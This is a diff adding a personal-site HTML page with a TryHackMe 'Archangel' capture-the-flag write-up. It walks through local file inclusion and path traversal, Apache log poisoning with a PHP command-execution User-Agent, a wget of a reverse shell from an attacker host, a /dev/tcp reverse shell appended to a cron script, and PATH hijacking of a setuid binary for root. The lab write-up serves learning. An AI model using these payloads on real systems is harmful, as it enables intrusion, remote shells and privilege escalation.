@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Archangel | Technical Intelligence Labs</title>
+    <link rel="stylesheet" href="../css/custom.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
+        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
+        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
+        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
+        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
+        .markdown-content blockquote { 
+            position: relative;
+            border-left: 2px solid #22c55e; 
+            padding: 1.5rem 0 1.5rem 1.75rem; 
+            color: #cbd5e1; 
+            margin-bottom: 2.5rem; 
+            font-style: normal; 
+            background: rgba(34, 197, 94, 0.03);
+            border-radius: 0 4px 4px 0;
+            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
+        }
+        .markdown-content blockquote::before {
+            content: "TECHNICAL_INTELLIGENCE";
+            position: absolute;
+            top: -9px;
+            left: 0;
+            background: #22c55e;
+            color: #000;
+            font-size: 0.6rem;
+            font-weight: bold;
+            padding: 2px 6px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
+        .markdown-content p { margin-bottom: 1.5rem; }
+        
+        .diag-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+        .diag-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 2px;
+            height: 100%;
+            background: #22c55e;
+            opacity: 0.5;
+        }
+        .diag-label {
+            display: block;
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            color: #64748b;
+            margin-bottom: 0.25rem;
+            letter-spacing: 0.1em;
+        }
+        .diag-value {
+            font-size: 0.9rem;
+            color: #cbd5e1;
+        }
+        .diag-blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">
+
+    <!-- Navigation -->
+    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+            <a href="../index.html" class="logo-container group flex items-center gap-3">
+                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
+            </a>
+
+            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
+                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
+                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
+                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
+                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
+                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
+                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
+                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="py-20 px-6 max-w-7xl mx-auto flex-grow w-full">
+        <!-- Post Header -->
+        <header class="mb-12 border-b border-slate-800 pb-12">
+            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
+                <span>// 2024-12-30</span>
+                <span>// ID: REF-Archangel</span>
+            </div>
+            
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Archangel</h1>
+            
+            <div class="flex flex-wrap gap-2">
+                <!-- Tags populated by python -->
+                <!-- tryhackme, ctf -->
+            </div>
+        </header>
+
+        <!-- Markdown Body -->
+        <div class="markdown-content">
+            <hr />
+<pre class="codehilite"><code>PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPrwb4vLZ/CJqefgxZMUh3zsubjXMLrKYpP8Oy5jNSRaZynNICWMQNfcuLZ2GZbR84iEQJrNqCFcbsgD+4OPyy0TXV1biJExck3OlriDBn3g9trxh6qcHTBKoUMM3CnEJtuaZ1ZPmmebbRGyrG03jzIow+w2updsJ3C0nkUxdSQ7FaNxwYOZ5S3X5XdLw2RXu/o130fs6qmFYYTm2qii6Ilf5EkyffeYRc8SbPpZKoEpT7TQ08VYEICier9ND408kGERHinsVtBDkaCec3XmWXkFsOJUdW4BYVhrD3M8JBvL1kPmReOnx8Q7JX2JpGDenXNOjEBS3BIX2vjj17Qo3V
+|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKhhd/akQ2OLPa2ogtMy7V/GEqDyDz8IZZQ+266QEHke6vdC9papydu1wlbdtMVdOPx1S6zxA4CzyrcIwDQSiCg=
+|   256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBE3FV9PrmRlGbT2XSUjGvDjlWoA/7nPoHjcCXLer12O
+80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Wavefire
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+
+<blockquote>
+<p>look at mail option  and you find another domain now add  that to /etc/hosts now I can see that website is under development so I fuzz</p>
+</blockquote>
+<pre class="codehilite"><code>===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 59]
+/test.php             (Status: 200) [Size: 286]
+</code></pre>
+
+<blockquote>
+<p><code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php</code></p>
+<p><code>http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php</code></p>
+</blockquote>
+<pre class="codehilite"><code>└─$ echo &quot;CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg== &quot; | base64 -d
+
+&lt;!DOCTYPE HTML&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+    &lt;title&gt;INCLUDE&lt;/title&gt;
+    &lt;h1&gt;Test Page. Not to be Deployed&lt;/h1&gt;
+
+    &lt;/button&gt;&lt;/a&gt; &lt;a href=&quot;/test.php?view=/var/www/html/development_testing/mrrobot.php&quot;&gt;&lt;button id=&quot;secret&quot;&gt;Here is a button&lt;/button&gt;&lt;/a&gt;&lt;br&gt;
+        &lt;?php
+
+        //FLAG: thm{explo1t1ng_lf1}
+
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+        if(isset($_GET[&quot;view&quot;])){
+        if(!containsStr($_GET['view'], '../..') &amp;&amp; containsStr($_GET['view'], '/var/www/html/development_testing')) {
+                include $_GET['view'];
+            }else{
+
+        echo 'Sorry, Thats not allowed';
+            }
+    }
+        ?&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+
+
+base64: invalid input
+</code></pre>
+
+<pre class="codehilite"><code>GET /test.php?view=/var/www/html/development_testing/..//..//..//..//..//etc/passwd HTTP/1.1
+</code></pre>
+
+<pre class="codehilite"><code>        &lt;/button&gt;&lt;/a&gt; &lt;a href=&quot;/test.php?view=/var/www/html/development_testing/mrrobot.php&quot;&gt;&lt;button id=&quot;secret&quot;&gt;Here is a button&lt;/button&gt;&lt;/a&gt;&lt;br&gt;
+        root:x:0:0:root:/root:/bin/bash
+        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+        bin:x:2:2:bin:/bin:/usr/sbin/nologin
+        sys:x:3:3:sys:/dev:/usr/sbin/nologin
+        sync:x:4:65534:sync:/bin:/bin/sync
+        games:x:5:60:games:/usr/games:/usr/sbin/nologin
+        man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+        backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+        list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+        irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+        nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+        systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+        systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+        syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+        messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+        _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+        uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
+        sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+        archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
+        &lt;/div&gt;
+        &lt;/body&gt;
+</code></pre>
+
+<blockquote>
+<p>The users<br />
+<code>root</code> <code>archangel</code></p>
+</blockquote>
+<pre class="codehilite"><code>test.php?view=/var/www/html/development_testing/..//..//..//..///var/log/apache2/access.log
+</code></pre>
+
+<pre class="codehilite"><code> curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..///var/log/apache2/access.log
+
+&lt;!DOCTYPE HTML&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+    &lt;title&gt;INCLUDE&lt;/title&gt;
+    &lt;h1&gt;Test Page. Not to be Deployed&lt;/h1&gt;
+
+    &lt;/button&gt;&lt;/a&gt; &lt;a href=&quot;/test.php?view=/var/www/html/development_testing/mrrobot.php&quot;&gt;&lt;button id=&quot;secret&quot;&gt;Here is a button&lt;/button&gt;&lt;/a&gt;&lt;br&gt;
+
+192.168.153.193 - - [05/Dec/2025:18:20:50 +0530] &quot;GET / HTTP/1.0&quot; 200 19462 &quot;-&quot; &quot;-&quot;
+192.168.153.193 - - [05/Dec/2025:18:20:51 +0530] &quot;GET / HTTP/1.1&quot; 200 19462 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;
+192.168.153.193 - - [05/Dec/2025:18:20:51 +0530] &quot;PROPFIND / HTTP/1.1&quot; 405 523 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;
+192.168.153.193 - - [05/Dec/2025:18:20:51 +0530] &quot;OPTIONS / HTTP/1.1&quot; 200 181 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;
+192.168.153.193 - - [05/Dec/2025:18:20:51 +0530] &quot;PROPFIND / HTTP/1.1&quot; 405 523 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html
+</code></pre>
+
+<blockquote>
+<p>log poison into user agent <code>&lt;?php system($_GET['cmd']); ?&gt;</code> I use caido</p>
+</blockquote>
+<pre class="codehilite"><code>Host: mafialive.thm
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: &lt;?php system($_GET['cmd']); ?&gt;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+</code></pre>
+
+<blockquote>
+<p>upload revshell into target machine</p>
+</blockquote>
+<pre class="codehilite"><code>test.php?view=/var/www/html/development_testing/..//..//..//..///var/log/apache2/access.log&amp;wget http://attackerip:80/revshell.php
+</code></pre>
+
+<blockquote>
+<p>in this situation have to encode url because cant keep space in url so add <code>%20</code></p>
+</blockquote>
+<pre class="codehilite"><code>&amp;wget%20http://attackerip:80/revshell.php
+</code></pre>
+
+<blockquote>
+<p>so now excute php file to get shell</p>
+</blockquote>
+<pre class="codehilite"><code>GET /test.php?view=/var/www/html/development_testing//..//..//..//log/apache2/access.log&amp;cmd=php%20php-reverse-shell.php HTTP/1.1
+Host: mafialive.thm
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: &lt;?php system($_GET['cmd']); ?&gt;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+</code></pre>
+
+<pre class="codehilite"><code>nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [192.168.153.193] from (UNKNOWN) [10.66.188.232] 44962
+Linux ubuntu 4.15.0-123-generic #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 20:36:37 up  2:20,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+www-data@ubuntu:/$ export TERM=xterm
+export TERM=xterm
+www-data@ubuntu:/$ ^Z
+zsh: suspended  nc -lnvp 9001
+
+┌──(kali㉿kali)-[~/git/php-reverse-shell]
+└─$ stty raw -echo; fg
+stty rows 38 columns 116
+[1]  + continued  nc -lnvp 9001
+
+www-data@ubuntu:/$ 
+www-data@ubuntu:/$ 
+</code></pre>
+
+<pre class="codehilite"><code>www-data@ubuntu:/$ cd /home
+www-data@ubuntu:/home$ ls
+archangel
+www-data@ubuntu:/home$ cd archangel
+www-data@ubuntu:/home/archangel$ ls
+myfiles  secret  user.txt
+www-data@ubuntu:/home/archangel$ cat user.txt
+</code></pre>
+
+<pre class="codehilite"><code>www-data@ubuntu:/home/archangel$ cat /etc/crontab
+
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/1 *   * * *   archangel /opt/helloworld.sh
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+</code></pre>
+
+<pre class="codehilite"><code>www-data@ubuntu:/$ cd /opt
+cd /opt
+www-data@ubuntu:/opt$ ls
+ls
+backupfiles  helloworld.sh
+www-data@ubuntu:/opt$ cat helloworld.sh
+cat helloworld.sh
+#!/bin/bash
+echo &quot;hello world&quot; &gt;&gt; /opt/backupfiles/helloworld.txt
+www-data@ubuntu:/opt$ echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.153.193/9002 0&gt;&amp;1&quot; &gt;&gt; helloworld.sh
+lloworld.sh-i &gt;&amp; /dev/tcp/attacker-ip/9002 0&gt;&amp;1&quot; &gt;&gt; hel
+</code></pre>
+
+<blockquote>
+<p>wait a min</p>
+</blockquote>
+<pre class="codehilite"><code>nc -lnvp 9002
+listening on [any] 9002 ...
+connect to [192.168.153.193] from (UNKNOWN) [10.65.140.204] 59824
+bash: cannot set terminal process group (992): Inappropriate ioctl for device
+bash: no job control in this shell
+archangel@ubuntu:~$ ls
+ls
+myfiles
+secret
+user.txt
+archangel@ubuntu:~$ cd secret
+cd secret
+archangel@ubuntu:~/secret$ ls
+ls
+backup
+user2.txt
+</code></pre>
+
+<pre class="codehilite"><code>archangel@ubuntu:~/secret$ ls
+ls
+backup  user2.txt
+archangel@ubuntu:~/secret$ strings backup
+strings backup
+/lib64/ld-linux-x86-64.so.2
+setuid
+system
+__cxa_finalize
+setgid
+__libc_start_main
+libc.so.6
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u+UH
+[]A\A]A^A_
+cp /home/user/archangel/myfiles/* /opt/backupfiles
+:*3$&quot;
+GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
+/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o
+__a
+</code></pre>
+
+<blockquote>
+<p><code>cp /home/user/archangel/myfiles/* /opt/backupfiles</code></p>
+</blockquote>
+<pre class="codehilite"><code>archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+sr/local/bin:/sbin:/bin:/usr/sbin:/usr/bincal/sbin:/us
+archangel@ubuntu:~/secret$  /bin/chmod +x /home/archangel/secret/cp
+ /bin/chmod +x /home/archangel/secret/cp
+archangel@ubuntu:~/secret$ echo &quot;$PATH&quot;
+ls -la /home/archangel/secret
+./backupecho &quot;$PATH&quot;
+/home/archangel/secret:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+archangel@ubuntu:~/secret$ ls -la /home/archangel/secret
+total 36
+drwxrwx--- 2 archangel archangel  4096 Dec  6 00:00 .
+drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
+-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
+-rwxrwxr-x 1 archangel archangel    13 Dec  6 00:04 cp
+-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt
+</code></pre>
+
+<pre class="codehilite"><code>archangel@ubuntu:~/secret$ backup
+backup
+root@ubuntu:~/secret# ls
+ls
+backup  cp  user2.txt
+root@ubuntu:~/secret# cd /root
+cd /root
+root@ubuntu:/root# ls
+ls
+root.txt
+root@ubuntu:/root# cat root.txt
+cat root.txt
+</code></pre>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
+            <div class="diag-card text-left">
+                <span class="diag-label">Access_Level</span>
+                <span class="diag-value">OMNI_READ_ONLY</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Encryption</span>
+                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Signal_Strength</span>
+                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">System_Status</span>
+                <span class="diag-value">STABLE_HARDENED</span>
+            </div>
+        </div>
+
+        <div class="flex justify-center gap-6 mb-8">
+            <a href="https://github.com/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
+                    class="fa-brands fa-github"></i></a>
+            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
+                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
+            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
+                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
+                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
+        </div>
+        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
